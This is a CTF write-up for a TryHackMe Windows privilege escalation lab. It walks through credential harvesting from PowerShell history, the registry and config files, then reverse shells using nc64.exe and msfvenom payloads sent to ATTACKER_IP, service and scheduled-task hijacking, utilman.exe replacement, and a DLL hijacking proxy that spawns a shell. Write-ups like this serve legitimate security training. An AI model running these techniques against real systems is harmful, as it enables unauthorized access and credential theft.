---
title: THM Windows PrivEsc 2022
date: 2022-06-20 12:00:00 -0700
categories: [tryhackme,ctf]
tags: [writeup,hacking,windows] # TAG names should always be lowercase
---
# Windows Privlage Escelation Writeup
---

*| Write-up by B4ndw1d7h |*

---
First off I want to thank tryhackme and munra for the amazing room. it was really engaging and challenging (especially if you have never done windows privesc before). any who lets start.


(tips*)
do all the tasks from cmd not powershell
(i know its not as user friendly but its the only way i got them to work properly throughout the room)
the only thing i would use powershell for is retrieving a file from the attacker box with wget

---
## Box 1 
### task 3 
---
#### Powershell history

- Start the machine
- Open the command prompt (cmd.exe)
- Follow steps in task

```shell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

Here you will find the answer to the first task.


---
#### Saved Windows Creds

In the Command prompt (cmd.exe) follow steps in task.
Enter the first command this will see if their are any saved creds on the system.

```shell
cmdkey /list
```

You should see another user ***mike.katz***.
Try to see if you can access a terminal as this user.

```shell
runas /savecred /user:mike.katz cmd.exe
```

This should open a command prompt as the user mike.katz.  On the users desktop will be the 3rd answer.

---
#### IIS Config

Again follow the task and enter the command.

```shell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

You should see in the given text the 2nd answer.


---
#### Retrieve Creds from Software:PuTTY

For this one I had trouble running the command in both cmd and powershell due to the query made in the task missing the last file to access the credentials
the way I solved this was to open Registry Editor and navigate to the location specified in the task 
 ```shell
HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\
```
Once there I saw that their is one more file I needed to go into in order to retrieve the answer.
Now you can either look for the "**ProxyPassword**" manually or just add the directory to the end of your command and retrieve the last answer.

```shell
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\My%20ssh%20server /f "ProxyPassword" /s
```



---
### task 4
---
#### Scheduled tasks

This one I had a bit of trouble getting the reverse shell to run.
Instead of using

``` shell
echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

use 

```shell
notepad C:\tasks\schtask.bat
```

You will need to manually open "**schtask.bat**" in notepad and type the reverse shell in otherwise it will consistently give you an error and wont execute.

```shell
C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Now setup a listener on the attack box.

```bash
nc -lvp 4444
```

Make sure you run the task in Command prompt as well.

```shell
schtasks /run /tn vulntask
```

Now you should have a shell. the flag will be in taskusr1's desktop.


---
### task 5
---
#### Insecure permissions on service executable

Here it is pretty strait forward. This will have you primarily use msfvenom to craft a reverse shell payload to get your shell.

On your attack box craft your payload with this.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
(you can use this over the rest of the task)

Get this on the target however you choose. I like python so I used

```bash
python3 -m http.server
```

On the target machine I used wget in powershell to retrieve the file.

```powershell
wget http://ATTACK_BOX_IP:8000/rev-svc.exe -O rev-svc.exe
```


Make a copy of "**rev-svc.exe**"(to make the rest of the task easier)

cd to the services directory

```shell
cd C:\PROGRA~2\SYSTEM~1\
```

Now change the name of the service we want 

```shell
move WService.exe WService.exe.bkp
```

and change the name of one of our "**rev-svc.exe**" to the service name.

```shell
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
```

Now grant full permissions to the file as well.

```shell
icacls WService.exe /grant Everyone:F
```

Open a listener on your attack box.

```bash
nc -lvp 4445
```

Now stop and start the service on the windows box.

```shell
sc stop windowsscheduler
```

```shell
sc start windowsscheduler
```

You should now have a shell. The flag is in svcusr1 desktop.

---
#### unquoted service paths

For this we will be exploiting the "**disk sorter enterprise**" service.

Read through the task to better understand what we will be doing.

Now to solve the problem we will copy the payload we just made "**rev-svc.exe**" and use one of them as our reverse shell instead of making another.

Now move the payload to the "**MyPrograms**" directory under the name Disk.exe.

```shell
move C:\Users\thm-unpriv\rev-svc.exe C:\MyPrograms\Disk.exe
```

and give it full permissions.

```shell
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
```

Now setup your listener.

```bash
nc -lvp 4445
```

Now like before stop and start the service.

```shell
sc stop "disk sorter enterprise" 
```

```shell
sc start "disk sorter enterprise"
```

You should now have a shell. The flag is in svcusr2's desktop.


---
#### insecure service permissions

Here we will do the same as the last 2 with a bit of a twist.

Take our last "**rev-svc.exe**" and give it full permissions.

```shell
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

Now we will change the service's associated executable and account.

```shell
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc.exe" obj= LocalSystem
```

Now we can stop and start the service.

```shell
sc stop THMService 
```

```shell
sc start THMService
```

You now should have a shell. The flag is in the admin's desktop.


---
### task 6
---
Here you will need to access the machine with RDP so if your on windows you have it already if you are on Linux use "**Remmina**" it is already on the attack box. (if it asks for a password ignore it and continue).

Once connected start following the task.

Here you have 3 routes you could take to get a shell and get the flag however the one I used was the 2nd option. (I couldn't get the 1st to work. however the 2nd really emphasizes "Ease of Access")

so starting with the second option

#### SeTakeOwnership
We will be attacking the "Ease of Access" prompt when you are at the lock screen. 

If you follow the task you see that the prompt is just an application run by system when used. "**utilman.exe**" 

So first thing we will do to exploit this is take ownership of the utilman.exe.

```shell
takeown /f C:\Windows\System32\Utilman.exe
```

Now like the other tasks give it full permissions.

```shell
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Now we will simply rename the cmd.exe executable to utilman.exe and lock the screen.(Follow the instructions on the task)

```shell
copy cmd.exe utilman.exe
```

Now hit the "Ease of Access" button and bam shell.
The flag is in the admins desktop


---
## task 7
---
#### DLL high-jacking

This one was giving me a bit of an issue when it came to crafting the payload, but don't worry you'll see the syntax needed.

So start again by reading the task (the info is always helpful to understand).

It started getting a bit hard for me to understand ( English not being my first language) but the simple rundown is this.

Go to the location of the VNC Server application.

```shell
C:\Programfiles\RealVNC\VNC Server\
```

Copy the contents to this folder. no need to rename anything.

```shell
C:\Users\thm-unpriv\AppData\Local\Temp\
```

Now on your attack box in the share directory create a proxy.c file and a get_exports.py file.

```bash
touch proxy.c
```

```bash
touch get_exports.py
```

In the **proxy.c** file paste this

```c
#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
             system('C:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 6666');
    }

    return TRUE;
}
```

In the get_exports.py paste this

```python
import pefile
import argparse

parser = argparse.ArgumentParser(description='Target DLL.')
parser.add_argument('--target', required=True, type=str,help='Target DLL')
parser.add_argument('--originalPath', required=True, type=str,help='Original DLL path')

args = parser.parse_args()

target = args.target
original_path = args.originalPath.replace('\\','/')

dll = pefile.PE(target)

print("EXPORTS", end="\r\n")

for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        print(f"    {export.name.decode()}={original_path}.{export.name.decode()} @{export.ordinal}", end="\r\n")
```

Now go back to your home folder and run the smbserver again like we did in the last task.

```bash
/opt/impacket/examples/smbserver.py -smb2support -username thm-unpriv -password Password321 public share
```

Hop on the windows box and copy over the **adsldpc.dll** to your attack box.

```shell
copy C:\Windows\System32\adsldpc.dll \\ATTACKER_IP\public\
```

Now the dll should be in your share folder.
cd into the share folder and run the **get_exports.py** script with the following arguments.

```bash
python3 get_exports.py --target adsldpc.dll --originalPath 'C:\Windows\System32\adsldpc.dll' > proxy.def
```

Now we will compile a new dll (again I recomend using the attack box as it already has the required packages).

- We will run this first to output a proxy.o file
```bash
x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel
```
- Then compile the .o and .def files to the .dll
```bash
x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll
```

Now get the proxy.dll onto the windows box however you like again I used python. and move it to the temp directory under the name **adsldpc.dll**

```shell
move proxy.dll C:\Users\thm-unpriv\AppData\Local\Temp\adsldpc.dll
```

Now to trigger the repair process open system settings -> apps -> apps & features, and scroll down to VNC Server.

Hop to your attack box and start up a listener on port 6666 (the payload we put in the proxy.c file) 

```bash
nc -lvp 6666
```

now go back to the windows box and press modify -> repair -> repair, and you should get a shell. The flag is on the admin's desktop.


---
## Conclusion
This was a really great room as a beginner even with the little hick-ups I had regarding my own lack of knowledge in windows privesc. As a starting point I cant thank tryhackme and munra enough for the great revamp of the room!